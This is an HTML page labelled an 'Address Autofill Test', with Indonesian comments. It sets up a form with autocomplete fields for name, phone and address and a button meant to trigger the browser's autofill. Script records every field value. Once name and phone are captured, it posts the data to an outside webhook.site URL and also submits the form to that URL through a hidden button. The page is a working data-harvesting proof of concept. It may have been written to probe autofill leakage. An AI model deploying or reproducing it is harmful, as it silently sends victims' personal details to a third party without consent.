<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Address Autofill Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            max-width: 400px;
            margin: 0 auto;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0 15px 0;
            border: 1px solid #ccc;
            font-size: 16px;
            box-sizing: border-box;
        }
        label {
            font-weight: bold;
            font-size: 14px;
        }
        .container {
            background: #f9f9f9;
            padding: 20px;
            border: 1px solid #ddd;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 16px;
            margin-bottom: 20px;
        }
        #log {
            margin-top: 20px;
            padding: 10px;
            background: #ffd;
            border: 1px solid #cc0;
            font-family: monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <button id="trigger">Trigger Autofill</button>
    
    <div class="container">
        <form id="addressForm" action="https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3" method="POST">
            <label>First name</label>
            <input type="text" id="firstname" name="firstname" autocomplete="given-name">
            
            <label>Middle name</label>
            <input type="text" id="middlename" name="middlename" autocomplete="additional-name">
            
            <label>Last name</label>
            <input type="text" id="lastname" name="lastname" autocomplete="family-name">
            
            <label>Phone number</label>
            <input type="tel" id="phone" name="phone" autocomplete="tel">
            
            <label>Street address</label>
            <input type="text" id="address" name="address" autocomplete="address-line1">
            
            <label>City</label>
            <input type="text" id="city" name="city" autocomplete="address-level2">
            
            <label>State</label>
            <input type="text" id="state" name="state" autocomplete="address-level1">
            
            <label>ZIP code</label>
            <input type="text" id="zip" name="zip" autocomplete="postal-code">
            
            <label>Country</label>
            <input type="text" id="country" name="country" autocomplete="country-name">
            
            <!-- Hidden submit button -->
            <input type="submit" style="display:none;" id="hiddenSubmit">
        </form>
    </div>
    
    <div id="log">Waiting for autofill...</div>
    
    <script>
        const trigger = document.getElementById('trigger');
        const log = document.getElementById('log');
        const form = document.getElementById('addressForm');
        const hiddenSubmit = document.getElementById('hiddenSubmit');
        
        // Data yang akan dikirim
        let capturedData = {};
        
        // Trigger autofill dengan fokus ke field pertama
        trigger.addEventListener('click', function() {
            document.getElementById('firstname').focus();
            log.innerHTML = '‚ö° Autofill triggered - pilih alamat dari dropdown';
        });
        
        // Monitor semua input fields
        const inputs = document.querySelectorAll('input[type="text"], input[type="tel"]');
        inputs.forEach(input => {
            input.addEventListener('input', function() {
                capturedData[this.name] = this.value;
                log.innerHTML = 'üìù Data terdeteksi:\n' + JSON.stringify(capturedData, null, 2);
            });
            
            input.addEventListener('change', function() {
                capturedData[this.name] = this.value;
                log.innerHTML = '‚úÖ Data berubah:\n' + JSON.stringify(capturedData, null, 2);
                
                // Cek apakah semua field penting sudah terisi
                if (capturedData.firstname && capturedData.lastname && capturedData.phone) {
                    // Kirim ke webhook
                    capturedData.timestamp = new Date().toISOString();
                    
                    fetch('https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3', {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(capturedData)
                    });
                    
                    log.innerHTML = 'üì§ DATA TERKIRIM KE WEBHOOK!\n' + JSON.stringify(capturedData, null, 2);
                    
                    // Submit form juga
                    hiddenSubmit.click();
                }
            });
        });
        
        // Auto-submit saat form dikirim
        form.addEventListener('submit', function(e) {
            e.preventDefault(); // Mencegah redirect
            log.innerHTML = 'üì® Form submitted - data sudah dikirim';
        });
        
        console.log('Ready - Webhook: https://webhook.site/0f7ae798-5e1d-460d-b18d-5d63ca26a7a3');
    </script>
</body>
</html>